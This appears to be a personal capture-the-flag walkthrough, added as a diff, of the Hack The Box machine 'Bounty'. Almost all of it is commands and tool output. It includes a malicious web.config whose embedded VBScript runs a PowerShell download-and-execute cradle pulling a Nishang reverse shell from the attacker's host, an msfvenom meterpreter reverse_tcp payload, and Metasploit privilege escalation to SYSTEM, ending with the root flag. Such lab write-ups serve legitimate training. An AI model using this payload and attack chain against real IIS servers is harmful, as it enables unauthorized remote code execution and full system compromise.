@@ -1,0 +1,227 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.93
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 127
+
+command: sudo nmap -sSVC -A -p 80 10.10.10.93
+result:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Bounty
+|_http-server-header: Microsoft-IIS/7.5
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   48.22 ms 10.10.16.1
+2   48.28 ms 10.10.10.93
+
+access: http://10.10.10.93/
+
+get nishanq powershell on here:
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+add this code on end of code:
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.19 -Port 7979                                                                                                    
+
+create web.config:
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<%@ Language=VBScript %>
+<%
+  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.19/Invoke-PowerShellTcp.ps1')")
+%>
+
+command: rlwrap nc -lvnp 7979
+command: python3 -m http.server 80
+
+upload web.config
+access: http://10.10.10.93/transfer.aspx
+access: http://10.10.10.93/transfer.aspx
+
+we will get shell.
+
+upload msfvenom x64 meterpreter to target machine using smbserver.py.
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.19 lport=4444 -f exe > securitytutorialsx64.exe
+
+PS C:\users\merlin\desktop> dir
+
+
+    Directory: C:\users\merlin\desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---          7/9/2023  10:21 PM      73802 rev_10.10.16.19.exe               
+-a---          7/8/2023  11:24 PM      73802 securitytutorials.exe             
+-a---         7/13/2023  12:44 AM       7168 securitytutorialsx64.exe      
+
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.16.19      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x64/windows  BOUNTY\merlin @ BOUNTY  10.10.16.19:4444 -> 10.10.10.93:49172
+                                                              (10.10.10.93)
+msf6 post(multi/recon/local_exploit_suggester) > options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION          1                yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available e
+                                               xploits
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.93 - Collecting local exploits for x64/windows...
+[*] 10.10.10.93 - 185 exploit checks are being tried...
+[+] 10.10.10.93 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+[+] 10.10.10.93 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[*] Running check method for exploit 43 / 43
+[*] 10.10.10.93 - Valid modules for session 1:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+
+msf6 exploit(windows/local/ms10_092_schelevator) > options
+
+Module options (exploit/windows/local/ms10_092_schelevator):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   SESSION   1                yes       The session to run this module on
+   TASKNAME                   no        A name for the created task (default random)
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.16.19      yes       The listen address (an interface may be specified)
+   LPORT     8181             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Vista / 7 / 2008 (Dropper)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/ms10_092_schelevator) > run
+
+[*] Started reverse TCP handler on 10.10.16.19:8181 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated.
+[*] Preparing payload at C:\Windows\TEMP\wWNJNgyNVYPq.exe
+[*] Creating task: 48rWUFBokb2JZH6
+[*] Reading the task file contents from C:\Windows\system32\tasks\48rWUFBokb2JZH6...
+[*] Original CRC32: 0x780d6d82
+[*] Final CRC32: 0x780d6d82
+[*] Writing our modified content back...
+[*] Validating task: 48rWUFBokb2JZH6
+[*] Disabling the task...
+[*] SUCCESS: The parameters of scheduled task "48rWUFBokb2JZH6" have been changed.
+[*] Enabling the task...
+[*] SUCCESS: The parameters of scheduled task "48rWUFBokb2JZH6" have been changed.
+[*] Executing the task...
+[*] Sending stage (200774 bytes) to 10.10.10.93
+[*] Meterpreter session 2 opened (10.10.16.19:8181 -> 10.10.10.93:49173) at 2023-07-13 05:45:13 +0700
+[*] Deleting task 48rWUFBokb2JZH6...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 1792 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+cfcee297dba361f28ffe8a5198d0223a
+
+resource:
+https://0xdf.gitlab.io/2018/10/27/htb-bounty.html#escalation-method-2-kernel-exploits---Metasploit
